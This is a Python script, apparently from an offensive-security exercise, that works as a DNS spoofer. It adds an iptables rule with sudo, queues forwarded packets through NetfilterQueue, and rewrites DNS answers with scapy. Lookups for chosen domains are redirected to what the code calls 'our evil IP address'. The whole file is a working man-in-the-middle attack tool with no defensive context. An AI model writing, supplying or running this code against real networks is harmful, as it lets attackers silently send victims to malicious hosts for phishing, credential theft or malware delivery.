#! /bin/python

import subprocess
import time
from argparse import ArgumentParser

import scapy.all as scapy
from netfilterqueue import NetfilterQueue


def parse_cli_args():
    """Parse arguments from command-line interface."""
    parser = ArgumentParser(prog="DNS Spoofer")
    parser.add_argument("-t", "--target-domains",
                        nargs='+',
                        required=True,
                        metavar="TARGET DOMAIN",
                        dest="targets",
                        help="Domain names that we want to spoof")
    parser.add_argument("-d", "--destined-domain",
                        nargs=1,
                        required=True,
                        metavar="DESTINATION IP ADDRESS",
                        dest="dest",
                        help="Our evil IP address that we want the victim to reach")
    return parser.parse_args()


# Parse CLI arguments
args = parse_cli_args()


def process_packet(packet):
    """A callback function to process a trapped packet."""
    # packet.get_payload() returns the payload as a string
    scapy_packet = scapy.IP(packet.get_payload())
    # Only show DNS Response Record (DNSRR - DNS RESOURCE RECORD which is an answer)
    # DNS Request is DNSQR (DNS Question Record)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        for domain in args.targets:
            if domain in qname:
                print("[+] Spoofing " + qname)

                # Craft a RR for our malicious response
                answer = scapy.DNSRR(rrname=qname, rdata=args.dest)
                # Modify the `an` and `ancount` fields
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Delete other fields and have scapy set them automatically and properly for us
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                # As payload of the original packet is a string,
                # we must convert our crafted DNS response to a string
                packet.set_payload(str(scapy_packet))
                break

    packet.accept()


### [MAIN ROUTINE] ###
# INPUT chain is used for packets coming in this machine
# OUTPUT chain is used for packets coming out this machine (after being altered)
# FORWARD chain is used for packets that go through this machine (in & out - after being altered)
subprocess.call(
    "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
try:
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("sudo iptables --flush", shell=True)
    print("[+] Flushing iptables...")
    time.sleep(2)
